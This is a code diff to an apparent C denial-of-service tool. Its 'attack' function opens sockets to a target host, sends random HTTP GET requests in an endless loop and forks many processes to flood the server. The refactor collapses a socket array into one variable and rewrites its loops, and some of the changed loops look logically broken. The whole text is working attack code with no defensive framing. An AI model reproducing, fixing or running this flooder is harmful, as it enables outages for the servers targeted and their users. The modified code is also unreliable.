@@ -63,24 +63,23 @@ void broke(int s)
 
 void attack(char *host, char *port, int id) 
 {
-	int sockets[Connections];
-	int x, r, i, n, buf;
+	int sockets;
+	int r, i, n, buf;
+	int x = 0;
 	char string[10];
 	static int j = 0;
 	char httpbuf[2024];
 	char s_copy[132];
 
-	for(x=0; x!= Connections; x++)
-		sockets[x]=0;
-
+	sockets = 0;
 	signal(SIGPIPE, &broke);
 
 	while(1) 
 	{
-		for(x=0; x != Connections; x++) 
+		while(x != Connections)
 		{
-			if(sockets[x] == 0)
-				sockets[x] = make_socket(host, port);
+			if(sockets == 0)
+				sockets = make_socket(host, port);
     
 			srand(time(NULL));
 			for( j = 0; j < 9; j++)
@@ -89,9 +88,9 @@ void attack(char *host, char *port, int id)
 			sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
 			strncpy(s_copy, httpbuf, sizeof(s_copy));
 			int sizebuf = sizeof s_copy - 1;
-			r=write(sockets[x], s_copy, sizebuf);
-			close(sockets[x]);
-			sockets[x] = make_socket(host, port);
+			r=write(sockets, s_copy, sizebuf);
+			close(sockets);
+			sockets = make_socket(host, port);
 			fprintf(stderr, "[Thread:%i Connection:%d %s]\n", id,x,s_copy);
 		}
 		usleep(300000);
@@ -174,8 +173,9 @@ int create_socket(char *host, char *port)
 			break;
     }
 
-    for(x=0; x != Threads; ++x) 
+    while( x != Threads)
 	{
+		++x;
 		if(fork())
 			attack(hostd, portd, x);
 		usleep(200000);
